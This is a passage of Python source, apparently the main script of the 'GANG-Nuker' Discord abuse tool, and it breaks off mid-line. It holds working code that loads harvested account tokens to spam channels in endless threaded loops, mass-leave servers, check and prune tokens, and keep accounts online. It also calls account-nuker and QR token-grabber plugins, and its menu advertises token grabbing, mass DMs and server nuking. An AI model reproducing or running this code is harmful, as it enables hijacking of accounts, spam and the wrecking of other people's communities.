# https://github.com/TT-Tutorials | https://github.com/TT-Tutorials/GANG-Nuker
# Coded / Dev / Owner: ††#1792
# Copyright © GANG-Nuker
#########################################################

from utilities.Settings.common import *
from utilities.Settings.libarys import *
from utilities.Settings.update import search_for_updates

import utilities.Plugins.Account_Nuker
import utilities.Plugins.Auto_Login
import utilities.Plugins.DM_Deleter
import utilities.Plugins.Token_Info
import utilities.Plugins.QR_Grabber

w = Fore.WHITE
b = Fore.BLACK
g = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
# r = Fore.RESET

#########################################################

def Spinner():
	l = ['|', '/', '-', '\\', ' ']
	for i in l+l+l:
		sys.stdout.write(f"""\r {i}""")
		sys.stdout.flush()
		time.sleep(0.1)

global cls
def cls():
 os.system('cls' if os.name=='nt' else 'clear')

def tool():
  os.system('cls' if os.name=='nt' else 'clear')

def clearConsole(): return os.system(
    'cls' if os.name in ('nt', 'dos') else 'clear')

global useragent
def useragent():
    file = open('data/useragent.txt','r')
    useragent = (random.choice(list(file)))
    useragent2 = []
    useragent2.append(useragent)
    useragent1 = []

#########################################################

try:
    with open('data/logins.json') as f:
        config = json.load(f)
except:
    with open('data/logins.json', 'w') as f:
            print(f"\n[{g}#\x1b[95m\x1B[37m] Logging Into GANG-Nuker")
            login = input("[\x1b[95m#\x1b[95m\x1B[37m] Enter A Username: ")
            json.dump({"Login": login}, f, indent=4)
    input(f"\n[\x1b[95m#\x1b[95m\x1B[37m] Successfully Logged in as: [{m}{login}{w}]\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER to Continue: ")
    pass
with open('data/logins.json') as f:
    config = json.load(f)
login = config.get('Login')

def x():
    import datetime
    channel7 = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ")
    mess7 = input("[\x1b[95m>\x1b[95m\x1B[37m] Message: ")
    tokens = open("tokens.txt", "r").read().splitlines()
    def spam(token, channel7, mess7):
        url = 'https://discord.com/api/v9/channels/'+channel7+'/messages'
        data = {"content": mess7}
        header = {"authorization": token}
        while True:
            nowxy= datetime.datetime.now()
            r = requests.post(url, data=data, headers=header)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[Successfully Sent From]: {Fore.WHITE}{token[:63]}*********")
            else:
                print(f"{Fore.LIGHTRED_EX}[Failed To Send By]: {Fore.WHITE}{token[:63]}*********")
    for token in tokens:
        while True:
            threads = []
            for token in tokens:
                thread = threading.Thread(target=spam, args=(token,channel7,mess7))
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()

languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'aud'   : 'English, Austrlia',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

regions = [
    'brazil',
    'hongkong',
    'india',
    'japan',
    'rotterdam',
    'russia',
    'singapore',
    'southafrica',
    'sydney',
    'us-central',
    'us-east',
    'us-south',
    'us-west'
]


def spammer():
    global threads
    setTitle(f"")
    asc = asyncio.get_event_loop()
    tokens = open('tokens.txt', 'r').read().splitlines()
    clear = lambda: os.system('cls')
    clear()

    colorama.init()
    Write.Print(f'{login}\n', Colors.blue_to_purple,  interval=0.000)
    print('')
    print('')
    Write.Print("                                      /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                     /$$__  $$ /$$__  $$| $$$ | $$ /$$__  $$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                    | $$  \__/| $$  \ $$| $$$$| $$| $$  \__/\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                    | $$ /$$$$| $$$$$$$$| $$ $$ $$| $$ /$$$$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                    | $$|_  $$| $$__  $$| $$  $$$$| $$|_  $$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print(f' > [v{THIS_VERSION}]                         | $$  \ $$| $$  | $$| $$\  $$$| $$  \ $$\n', Colors.purple_to_blue, interval=0.000)
    Write.Print(f' > [gangnuker.org]                  |  $$$$$$/| $$  | $$| $$ \  $$|  $$$$$$/\n', Colors.purple_to_blue, interval=0.000)
    Write.Print(" > [Github.com/TT-Tutorials]         \______/ |__/  |__/|__/  \__/ \______/ \n", Colors.purple_to_blue, interval=0.000)
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_blue, interval=0.000)
    print(f'''{m}'''.replace('$', f'{m}${w}') + f'''
{m}[{w}1{Fore.RESET}{m}]{Fore.RESET} Server Joiner   {b}|{Fore.RESET}{m}[{w}9{Fore.RESET}{m}]{Fore.RESET}  Channel Spammer   {b}|{Fore.RESET}{m}[{w}17{Fore.RESET}{m}]{Fore.RESET} Patch Notes{Fore.RESET}         {b}|{Fore.RESET}{m}[{w}25{Fore.RESET}{m}]{Fore.RESET} Token Generator{Fore.RESET}
{m}[{w}2{Fore.RESET}{m}]{Fore.RESET} Server Leaver   {b}|{Fore.RESET}{m}[{w}10{Fore.RESET}{m}]{Fore.RESET} DM Spammer        {b}|{Fore.RESET}{m}[{w}18{Fore.RESET}{m}]{Fore.RESET} About/Activity{Fore.RESET}      {b}|{Fore.RESET}{m}[{w}26{Fore.RESET}{m}]{Fore.RESET} Nitro Generator{Fore.RESET}
{m}[{w}3{Fore.RESET}{m}]{Fore.RESET} Token Checker   {b}|{Fore.RESET}{m}[{w}11{Fore.RESET}{m}]{Fore.RESET} Friend Spammer    {b}|{Fore.RESET}{m}[{w}19{Fore.RESET}{m}]{Fore.RESET} Server Lookup{Fore.RESET}       {b}|{Fore.RESET}{m}[{w}27{Fore.RESET}{m}]{Fore.RESET} QR Token Grabber{Fore.RESET}
{m}[{w}4{Fore.RESET}{m}]{Fore.RESET} Token Onliner   {b}|{Fore.RESET}{m}[{w}12{Fore.RESET}{m}]{Fore.RESET} HypeSquad Joiner  {b}|{Fore.RESET}{m}[{w}20{Fore.RESET}{m}]{Fore.RESET} Token Infomation{Fore.RESET}    {b}|{Fore.RESET}{m}[{w}28{Fore.RESET}{m}]{Fore.RESET} Member ID Scraper{Fore.RESET}
{m}[{w}5{Fore.RESET}{m}]{Fore.RESET} Token Grabber   {b}|{Fore.RESET}{m}[{w}13{Fore.RESET}{m}]{Fore.RESET} Reaction Spammer  {b}|{Fore.RESET}{m}[{w}21{Fore.RESET}{m}]{Fore.RESET} Status Changer{Fore.RESET}      {b}|{Fore.RESET}{m}[{w}29{Fore.RESET}{m}]{Fore.RESET} PFP Changer{Fore.RESET}
{m}[{w}6{Fore.RESET}{m}]{Fore.RESET} Server MassDM   {b}|{Fore.RESET}{m}[{w}14{Fore.RESET}{m}]{Fore.RESET} NickName Changer  {b}|{Fore.RESET}{m}[{w}22{Fore.RESET}{m}]{Fore.RESET} Group Spammer{Fore.RESET}       {b}|{Fore.RESET}{m}[{w}30{Fore.RESET}{m}]{Fore.RESET} About{Fore.RESET}
{m}[{w}7{Fore.RESET}{m}]{Fore.RESET} Account Nuker   {b}|{Fore.RESET}{m}[{w}15{Fore.RESET}{m}]{Fore.RESET} Webhook Spammer   {b}|{Fore.RESET}{m}[{w}23{Fore.RESET}{m}]{Fore.RESET} Auto Login{Fore.RESET}          {b}|{Fore.RESET}{m}[{w}31{Fore.RESET}{m}]{Fore.RESET}{lr} THREADS{Fore.RESET}
{m}[{w}8{Fore.RESET}{m}]{Fore.RESET} Server Nuker    {b}|{Fore.RESET}{m}[{w}16{Fore.RESET}{m}]{Fore.RESET} VC Spammer        {b}|{Fore.RESET}{m}[{w}24{Fore.RESET}{m}]{Fore.RESET} DM Deleter{Fore.RESET}          {b}|{Fore.RESET}{m}[{w}32{Fore.RESET}{m}]{Fore.RESET}{lr} EXIT{Fore.RESET}''')
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.blue_to_purple, interval=0.000)
    choice = input(f'{m}[{w}>{m}]{w} Choice?: ')



#   JOINER
    if choice == '1':
        Spinner()
        setTitle(f"Server Joiner    |    ")
        gh = input(f"""
Joiner is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical GANG-Nuker Website!
                                   
[\x1b[95m1\x1b[95m\x1B[37m] GANG-Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>\x1b[95m\x1B[37m] Choice?: """)

        if gh in ['01','1']:
            webbrowser.open('https://gangnuker.org')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')



#   LEAVER
    if choice == '2':
        Spinner()
        setTitle(f"Server Leaver    |    ")
        token = open("tokens.txt", "r").read().splitlines()

        ID = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')

        apilink = "https://discord.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token,
                    "content-length": "0",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                    "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                }
                requests.delete(apilink, headers=headers)
            print(f'[{g}>{Fore.RESET}] Done')

        time.sleep(1)
        exit = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   TOKEN CHECKER
    if choice == '3':
            Spinner()
            setTitle(f"Token Checker    |    ") 
            print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Loading Tokens:\n')
            time.sleep(0.5)
            def success(text): lock.acquire(); print(f"[{Fore.GREEN}>{Fore.RESET}] {Fore.GREEN}Valid {Fore.RESET}{text}{Fore.RESET}"); lock.release()
            def invalid(text): lock.acquire(); print(f"[{Fore.RED}>{Fore.RESET}] {Fore.RED}Invalid {Fore.RED} {text}{Fore.RESET}"); lock.release()

            with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
            def save_tokens():
                with open("tokens.txt", "w") as f: f.write("")
                for token in tokens:
                    with open("tokens.txt", "a") as f: f.write(token + "\n")
            def removeDuplicates(file):
                lines_seen = set()
                with open(file, "r+") as f:
                    d = f.readlines(); f.seek(0)
                    for i in d:
                        if i not in lines_seen: f.write(i); lines_seen.add(i)
                    f.truncate()
            def check_token(token:str):
                response = requests.get('https://discord.com/api/v9/users/@me/library', headers={"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9","authorization": token,"cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}, timeout=5)
                if response.status_code == 200: success(f"| {token[:63]}*********")
                else: tokens.remove(token); invalid(f"| {token}")
            def check_tokens():
                threads=[]
                for token in tokens:
                    try:threads.append(threading.Thread(target=check_token, args=(token,)))
                    except Exception as e: pass
                for thread in threads: thread.start()
                for thread in threads: thread.join()
            def start():
                removeDuplicates("tokens.txt")
                check_tokens()
                save_tokens()

            start()
            print(f'\n\n[\x1b[95m>\x1b[95m\x1B[37m] All Tokens have been Checked! (tokens.txt has been updated with only vaild tokens!)')
            time.sleep(1)
            exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
            exit = clear()
            exit = spammer()



#   TOKEN ONLINER
    if choice == '4':
            Spinner()
            setTitle(f"Token Onliner    |    ")
            config = {
                "details": "FREE VERSION",
                "state": "https://gangnuker.org",
                "name": "GANG NUKER",
            }

            class Onliner:
                def __init__(self, token) -> None:
                    self.token    = token
                    self.statuses = ["online", "idle", "dnd"]

                def __online__(self):
                    ws = websocket.WebSocket()
                    ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
                    response = ws.recv()
                    event = json.loads(response)
                    heartbeat_interval = int(event["d"]["heartbeat_interval"]) / 1000
                    ws.send(
                        json.dumps(
                            {
                                "op": 2,
                                "d": {
                                    "token": self.token,
                                    "properties": {
                                        "$os": sys.platform,
                                        "$browser": "RTB",
                                        "$device": f"{sys.platform} Device",
                                    },
                                    "presence": {
                                        "game": {
                                            "name": config["name"],
                                            "type": 0,
                                            "details": config["details"],
                                            "state": config["state"],
                                        },
                                        "status": random.choice(self.statuses),
                                        "since": 0,
                                        "activities": [],
                                        "afk": False,
                                    },
                                },
                                "s": None,
                            "t": None,
                            }
                        )
                    )

                    print(f"\n[{g}+{w}] Online | {self.token}")

                    while True:
                        heartbeatJSON = {
                            "op": 1, 
                            "token": self.token, 
                            "d": "null"
                        }
                        ws.send(json.dumps(heartbeatJSON))
                        time.sleep(heartbeat_interval)


            for token in open("./tokens.txt", "r").read().splitlines():
                threading.Thread(target=Onliner(token).__online__).start()
            time.sleep(2)
            exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
            exit = clear()
            exit = spammer()



#   TOKEN GRABBER
    if choice == '5':
        Spinner()
        setTitle(f"Token Grabber    |    ")
        print(f"\n[{lr}!{w}] Token Grabber is Currently Down... Updating Soon!")

        time.sleep(2.5)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        clear()
        exit = spammer()




#   SERVER MASSDM
    if choice == '6':
        Spinner()
        setTitle(f"Server MassDM    |    ")
        print(f"\n[{lr}!{w}] Server MassDM is Currently Down... Updating Soon!")

        time.sleep(2.5)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        clear()
        exit = spammer()



#   ACCOUNT NUKER
    if choice == '7':
        Spinner()
        setTitle(f"Account Nuker    |    ")
        token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ')
        validateToken(token)
        Server_Name = str(input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server Name?: '))
        message_Content = str(input(f'[\x1b[95m>\x1b[95m\x1B[37m] MassDM Message?: '))
        if threading.active_count() < threads:
            threading.Thread(target=utilities.Plugins.Account_Nuker.GANGNUKER_START, args=(token, Server_Name, message_Content)).start()



#   SERVER NUKER
    if choice == '8':
        Spinner()
        setTitle(f"Server Nuker   |    ")
#       intents = discord.Client(intents=discord.Intents().all())
#       width = os.get_terminal_size().columns
        def menu():
                token = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Bot token : ")
                f = open("utilities/Plugins/ignore/.token", "w")
                f.write(token)
                f.close()

                prefix = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot prefix : ")
                f = open("utilities/Plugins/ignore/.prefix", "w")
                f.write(prefix)
                f.close()

                spammessage = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Spam message : ")
                f = open("utilities/Plugins/ignore/.message", "w")
                f.write(spammessage)
                f.
